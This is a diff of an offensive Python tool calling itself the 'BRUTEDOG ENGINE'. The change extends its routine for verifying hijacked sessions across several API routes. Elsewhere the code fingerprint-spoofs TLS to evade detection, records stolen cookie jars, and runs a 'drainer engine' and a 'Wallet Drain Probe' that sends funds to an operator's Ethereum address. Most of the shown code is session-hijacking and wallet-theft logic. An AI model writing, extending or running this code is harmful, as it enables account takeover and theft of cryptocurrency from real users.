@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v7.4 — State-Machine Logic & High-Aggression Exploitation Engine
+BRUTEDOG ENGINE v7.5 — State-Machine Logic & High-Aggression Exploitation Engine
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
@@ -63,6 +63,15 @@ FALLBACK_LOGIN_PATHS = [
     "/user/login",
     "/admin/login",
     "/api/admin/login",
+]
+
+SESSION_VERIFICATION_ENDPOINTS = [
+    "/api/user",
+    "/api/auth/me",
+    "/api/v1/user/profile",
+    "/api/v1/auth/session",
+    "/api/account",
+    "/dashboard"
 ]
 
 ERROR_PATTERNS = {
@@ -222,17 +231,22 @@ def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=Non
         
     return findings, mutated_payloads
 
-def verify_hijacked_session(transport, endpoint):
-    sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
-    status, headers, body = transport.request("GET", endpoint)
-    
-    is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body
-    if status == 200 and not is_spa_shell and len(body) > 100:
-        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
-        return True
-    else:
-        sys.stdout.write(f"{RED}[-] Session verification returned status {status} or generic SPA shell. Inactive.{RESET}\n")
-        return False
+def verify_hijacked_session(transport):
+    for endpoint in SESSION_VERIFICATION_ENDPOINTS:
+        sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected API route: {endpoint}{RESET}\n")
+        status, headers, body = transport.request("GET", endpoint)
+        
+        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body
+        # Accept JSON API responses or valid authenticated profile views
+        if status == 200 and not is_spa_shell and len(body) > 10:
+            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
+            success(f"[+] Session successfully verified against backend route: {endpoint}")
+            return True
+        else:
+            sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
+            
+    sys.stdout.write(f"{RED}[-] All session verification routes exhausted or inactive.{RESET}\n")
+    return False
 
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
@@ -295,7 +309,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.4")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.5")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -399,7 +413,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as sync_exc:
             warning(f"Cookie synchronization notice: {sync_exc}")
 
-        verify_hijacked_session(transport, "/dashboard")
+        verify_hijacked_session(transport)
 
     # Dispatch Referral Gateway Validation Probe against /user/register
     section("REFERRAL GATEWAY VALIDATION AUDIT")
@@ -476,7 +490,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     try:
         await run_drainer_engine(target_url)
         
-        # Execute automated financial endpoint assault using operator wallet destination and dynamic target host
         operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
         info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
         
